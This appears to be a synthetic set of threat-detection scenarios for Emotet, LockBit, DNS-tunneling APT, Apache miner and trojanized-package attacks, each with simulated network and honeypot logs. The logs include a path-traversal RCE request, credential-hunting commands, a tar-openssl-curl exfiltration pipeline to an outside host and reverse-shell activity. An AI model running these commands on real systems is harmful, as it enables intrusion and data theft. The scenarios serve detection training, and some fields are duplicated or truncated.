threat_assessment.description: Emotet malware delivered via phishing email with malicious macro-enabled Word document. The macro executes PowerShell to download and execute the Emotet payload, which establishes C2 communication.

network_activity_summary:
Network activity observed:
  - [2025-03-15T08:23:41Z] SMTP 192.168.1.105:49152 -> 203.0.113.45:25 (inbound, 285400 bytes) | From: invoice@trusted-supplier.com; Subject: Urgent Invoice #INV-2025-8834; Attachment: Invoice_March2025.docm
  - [2025-03-15T08:31:15Z] HTTPS 192.168.1.105:49200 -> 185.215.113.67:443 (outbound, 524288 bytes) | GET /update/config.php?id=a8f3b2 HTTP/1.1; User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)
  - [2025-03-15T08:35:00Z] HTTP 192.168.1.105:49210 -> 91.243.44.21:8080 (outbound, 1048 bytes) | POST /gate.php; Content-Type: application/x-www-form-urlencoded; Cookie: session=base64_encoded_system_info
  - [2025-03-15T08:40:00Z] HTTP 192.168.1.105:49215 -> 91.243.44.21:8080 (outbound, 2096 bytes) | POST /gate.php; beacon interval 300s; encrypted payload with system enumeration data
honeypot_activity_summary:
Honeypot interactions:
  - [2025-03-15T08:22:00Z] GenPot-SMTP: SMTP connection from 203.0.113.45 attempting to relay phishing emails. Commands: EHLO mail.trusted-supplier.com, MAIL FROM:<invoice@trusted-supplier.com>, RCPT TO: <multiple_recipients>

threat_assessment.description: LockBit 3.0 ransomware attack initiated via brute-forced RDP credentials. Attacker laterally moves across the network using SMB, deploys ransomware on multiple endpoints, deletes shadow copies, and encrypts files.

llm_analysis: [2025-03-20T02:15:00Z] RDP 45.155.205.99:54321 -> 10.0.0.5:3389 (inbound, 156000 bytes) | Multiple failed RDP authentication attempts (847 attempts in 30 minutes) followed by successful login as 'administrator'] [2025-03-20T02:48:00Z] SMB 10.0.0.5:49301 -> 10.0.0.10:445 (lateral, 2097152 bytes) | SMB file copy: lockbit3.exe to 10.0.0.10C$WindowsTempsvchost.exe] [2025-03-20T02:50:00Z] SMB 10.0.0.5:49302 -> 10.0.0.15:445 (lateral, 2097152 bytes) | SMB file copy: lockbit3.exe to 10.0.0.15C$WindowsTempsvchost.exe] [2025-03-20T03:00:00Z] HTTPS 10.0.0.5:49400 -> 185.100.87.41:443 (outbound, 52428800 bytes) | Exfiltration of compressed archive (sensitive_data.7z) to external server before encryption]
network_activity_summary:
Network activity observed:
  - [2025-03-20T02:15:00Z] RDP 45.155.205.99:54321 -> 10.0.0.5:3389 (inbound, 156000 bytes) | Multiple failed RDP authentication attempts (847 attempts in 30 minutes) followed by successful login as 'administrator'
  - [2025-03-20T02:48:00Z] SMB 10.0.0.5:49301 -> 10.0.0.10:445 (lateral, 2097152 bytes) | SMB file copy: lockbit3.exe to \\10.0.0.10\C$\Windows\Temp\svchost.exe
  - [2025-03-20T02:50:00Z] SMB 10.0.0.5:49302 -> 10.0.0.15:445 (lateral, 2097152 bytes) | SMB file copy: lockbit3.exe to \\10.0.0.15\C$\Windows\Temp\svchost.exe
  - [2025-03-20T03:00:00Z] HTTPS 10.0.0.5:49400 -> 185.100.87.41:443 (outbound, 52428800 bytes) | Exfiltration of compressed archive (sensitive_data.7z) to external server before encryption
  - [2025-03-20T03:15:00Z] SMB 10.0.0.5:49500 -> 10.0.0.255:445 (lateral, 4096 bytes) | WMI remote execution to trigger ransomware on all compromised endpoints simultaneously
honeypot_activity_summary:
Honeypot interactions:
  - [2025-03-20T02:00:00Z] GenPot-RDP: RDP brute force detected from 45.155.205.99 targeting multiple honeypot IPs. Commands: Multiple NLA authentication attempts with common usernames: admin, administrator, user, backup

threat_assessment.description: Advanced persistent threat operation using spearphishing with a weaponized PDF to deliver a DLL sideloading payload. The attacker performs reconnaissance, stages data, and exfiltrates through DNS tunneling to evade detection.

llm_analysis: [2025-03-10T14:05:00Z] HTTPS 192.168.10.50:49100 -> 104.21.45.112:443 (outbound, 1572864 bytes) | Download of weaponized PDF (Q1_Financial_Report.pdf) from compromised legitimate website
network_activity_summary:
Network activity observed:
  - [2025-03-10T14:05:00Z] HTTPS 192.168.10.50:49100 -> 104.21.45.112:443 (outbound, 1572864 bytes) | Download of weaponized PDF (Q1_Financial_Report.pdf) from compromised legitimate website
  - [2025-03-10T14:12:00Z] DNS 192.168.10.50:49150 -> 192.168.10.1:53 (outbound, 256 bytes) | DNS query: aW5pdGlhbF9jaGVja19pbg==.data.evil-analytics.com (base64 initial check-in encoded in subdomain)
  - [2025-03-11T09:00:00Z] DNS 192.168.10.50:49200 -> 192.168.10.1:53 (outbound, 4194304 bytes) | High volume DNS TXT queries to *.data.evil-analytics.com (2,847 queries in 1 hour - DNS tunneling pattern)
  - [2025-03-11T10:30:00Z] SMB 192.168.10.50:49300 -> 192.168.10.20:445 (lateral, 0 bytes) | Access to file shares: \\fileserver\finance\*, \\fileserver\hr\confidential\*
  - [2025-03-12T20:00:00Z] DNS 192.168.10.50:49500 -> 192.168.10.1:53 (outbound, 104857600 bytes) | Sustained DNS exfiltration: encoded chunks of collected documents via TXT record queries to exfil.evil-analytics.com
honeypot_activity_summary:
Honeypot interactions:
  - [2025-03-10T14:11:00Z] GenPot-DNS: Unusual DNS query patterns detected - high entropy subdomain names consistent with DNS tunneling. Commands: TXT query for c2check.evil-analytics.com, A query for update.evil-analytics.com
  - [2025-03-11T10:35:00Z] GenPot-Fileserver: Unauthorized access attempt to honeypot file shares from 192.168.10.50. Commands: SMB TreeConnect to \\honeypot-fs\confidential, Directory listing of \\honeypot-fs\confidential\contracts

threat_assessment.description: Exploitation of a vulnerable Apache web server (CVE-2025-XXXX) to deploy XMRig cryptocurrency miner. The attacker establishes persistence via cron jobs and attempts to spread to other internal servers.

llm_analysis: [2025-03-18T11:01:00Z] HTTP 77.91.68.29:44123 -> 10.10.10.80:80 (inbound, 512 bytes) | GET /cgi-bin/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1 (path traversal RCE exploit attempt)

report_metadata.scenario_name: Supply Chain Compromise via Trojanized Package

threat_assessment.description: A popular open-source Python package is trojanized with a reverse shell payload. When developers install the compromised package, it establishes a reverse shell connection and begins staging sensitive source code and credentials for exfiltration.

llm_analysis: [2025-03-22T16:00:00Z] HTTPS 192.168.5.30:49800 -> pypi.org:443 (outbound, 45000 bytes) | pip install requests-toolkit==2.31.1 (trojanized package mimicking popular 'requests' library)
network_activity_summary:
Network activity observed:
  - [2025-03-22T16:00:00Z] HTTPS 192.168.5.30:49800 -> pypi.org:443 (outbound, 45000 bytes) | pip install requests-toolkit==2.31.1 (trojanized package mimicking popular 'requests' library)
  - [2025-03-22T16:00:30Z] TCP 192.168.5.30:49850 -> 198.51.100.78:4444 (outbound, 512 bytes) | Reverse shell connection established (Python socket connect back to attacker C2)
  - [2025-03-22T16:05:00Z] TCP 192.168.5.30:49850 -> 198.51.100.78:4444 (bidirectional, 4096 bytes) | Commands received: whoami; hostname; cat /etc/passwd; env | grep -i key; find / -name '*.pem' -o -name '*.key' 2>/dev/null
  - [2025-03-22T16:30:00Z] HTTPS 192.168.5.30:49860 -> 198.51.100.78:443 (outbound, 209715200 bytes) | tar czf - /home/developer/projects/ | openssl enc -aes-256-cbc -pass pass:compromised | curl -X POST https://198.51.100.78/upload -d @-
  - [2025-03-22T17:00:00Z] SSH 192.168.5.30:49900 -> 192.168.5.31:22 (lateral, 1024 bytes) | SSH connection using stolen SSH key from developer machine to internal Git server
honeypot_activity_summary:
Honeypot interactions:
  - [2025-03-22T17:05:00Z] GenPot-SSH: SSH login attempt from 192.168.5.30 using stolen developer credentials to honeypot server. Commands: git clone git@honeypot-git:internal/proprietary-code.git, cat /etc/shadow
